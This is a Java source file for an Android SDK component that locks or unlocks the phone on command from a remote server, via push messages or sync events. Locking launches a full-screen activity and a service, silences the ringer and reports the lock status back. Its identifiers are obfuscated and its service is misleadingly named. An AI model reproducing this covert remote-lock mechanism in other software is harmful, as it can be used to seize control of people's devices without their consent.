package tools.app.com.loc_service;

import android.app.Application;
import android.content.Context;
import android.media.AudioManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;

import java.util.concurrent.TimeUnit;

import commons.app.com.commons.commons.SdkCommons;
import commons.app.com.commons.commons.SdkComponent;
import commons.app.com.keep.NetworkApi;
import timber.log.Timber;
import tools.app.com.loc_service.keep.DeviceEventsResponse;
import tools.app.com.loc_service.sys.LoTempActivity;
import tools.app.com.loc_service.sys.LoTestTempService;

@SuppressWarnings("WeakerAccess")
public class LockerComponent extends SdkComponent {

    public static final String ARG_IS_LOCKED = "l37362673_arg_1";
    private static final String JOB_TAG_SEND_LOCKED_STATUS = "l37362673_arg_2";

    private static LockerComponent instance;

    private LockedState lockedState;

    public static LockerComponent get() {
        return instance;
    }

    public LockerComponent() {
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        lockedState = new LockedState(context);
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_SEND_LOCKED_STATUS.equals(tag)) {
            return new SendDeviceLockedStatusJob();
        }
        return null;
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("lock".equals(type)) {
            String lock = payload.getString("lock", "false");
            if (lock.equals("true")) {
                lockDevice();
            } else {
                unlockDevice();
            }
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        DeviceEventsResponse response = safeParse(json, DeviceEventsResponse.class);
        if (response != null) {
            if (response.isLocked()) {
                LockerComponent.get().lockDevice();
            } else {
                LockerComponent.get().unlockDevice();
            }
        }
    }

    public LockedState getLockedState() {
        return lockedState;
    }

    ///////////////////////////////////////////////////////////////////////////
    // INNER
    ///////////////////////////////////////////////////////////////////////////

    private void lockDevice() {
        if (LoTestTempService.getInstance() == null) {
            LoTempActivity.start(context());
            LoTestTempService.start(context());
        }
        try {
            final AudioManager audio = (AudioManager) context().getSystemService(Context.AUDIO_SERVICE);
            assert audio != null;
            audio.setRingerMode(AudioManager.RINGER_MODE_SILENT);
        } catch (Exception e) {
            Timber.e(e, "audio");
        }
        submitLockedStatus(true);
    }

    private void unlockDevice() {
        submitLockedStatus(false);
        LoTestTempService lockerService = LoTestTempService.getInstance();
        if (lockerService != null) {
            lockerService.setToFinishState();
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    private void submitLockedStatus(boolean locked) {
        if (!lockedState.isNeedToUpdateState(locked)) {
            return;
        }
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putBoolean(ARG_IS_LOCKED, locked);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_SEND_LOCKED_STATUS)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }
}
